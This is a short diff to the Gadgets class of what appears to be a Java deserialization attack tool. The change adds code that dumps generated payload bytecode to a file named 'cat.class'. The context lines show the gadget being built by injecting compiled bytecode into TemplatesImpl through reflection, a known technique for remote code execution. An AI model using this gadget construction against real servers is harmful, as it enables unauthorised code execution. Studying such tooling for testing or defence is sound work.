@@ -9,6 +9,9 @@ import com.summersec.attack.deser.echo.EchoPayload;
 import com.summersec.attack.deser.echo.EchoPayload.Utils;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+
+import java.io.File;
+import java.io.FileOutputStream;
 import java.lang.reflect.Array;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
@@ -63,6 +66,12 @@ public class Gadgets {
         CtClass superClass = pool.get(abstTranslet.getName());
         clazz.setSuperclass(superClass);
         byte[] classBytes = clazz.toBytecode();
+        File file = new File("cat.class");
+        try (FileOutputStream fileOutputStream = new FileOutputStream(file)) {
+          fileOutputStream.write(classBytes);
+        }catch (Exception e){
+            System.out.println(e.getMessage());
+        }
         Field bcField = TemplatesImpl.class.getDeclaredField("_bytecodes");
         bcField.setAccessible(true);
         bcField.set(templates, new byte[][]{classBytes});
